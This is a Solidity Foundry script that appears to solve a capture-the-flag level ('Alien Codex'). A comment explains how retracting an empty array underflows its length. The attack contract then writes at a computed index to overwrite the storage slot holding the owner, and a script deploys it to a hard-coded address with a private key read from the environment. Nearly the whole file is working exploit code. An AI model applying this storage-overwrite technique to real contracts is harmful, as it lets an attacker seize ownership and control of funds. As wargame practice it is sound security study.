
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";


/*
    TL;DR: We are going to overwrite the owner variable of the inherited contract using underflow

    Storage layout of Alien
    0: owner (20 bytes), contact (1 byte)
    1: codex length

    Codex elements stored in keccak256(slot of array)
    slot codexStorage = keccak256(1)
    slot codexStorage = codex[0]
    slot codexStorage + 1 = codex[1]
    slot codexStorage + 2 = codex[2]

    After calling retract() on empty codex the length of the codex array will underflow to
    codexLength = 2**256 - 1
    slot codexStorage + 2**256 - 1 = codex[2**256 - 1]

    Find i such that :
    slot codexStorage + i = slot 0
    codexStorage + i = 0 therefore i = 0 - codexStorage
*/

interface IAlienCodex {
    function owner() external view returns (address);
    function codex(uint256) external view returns (bytes32);
    function retract() external;
    function makeContact() external;
    function revise(uint256 i, bytes32 _content) external;
}

// Contract Solution
contract AlienAttack {
    constructor(IAlienCodex alien) {
        alien.makeContact();
        alien.retract();

        uint256 codexStorage = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            i -= codexStorage;
        }
        alien.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(alien.owner() == msg.sender);
    }
}

contract AlienSolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new AlienAttack(IAlienCodex(0x46ea5576A0E7277CFaE98b50015f56B7AE769546));

        // Non Contract solution
        // IAlienCodex alienCodex = IAlienCodex(0x46ea5576A0E7277CFaE98b50015f56B7AE769546);

        // uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        // bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));

        // alienCodex.makeContact();
        // alienCodex.retract();
        // alienCodex.revise(index, myAddress);

        vm.stopBroadcast();
    }
}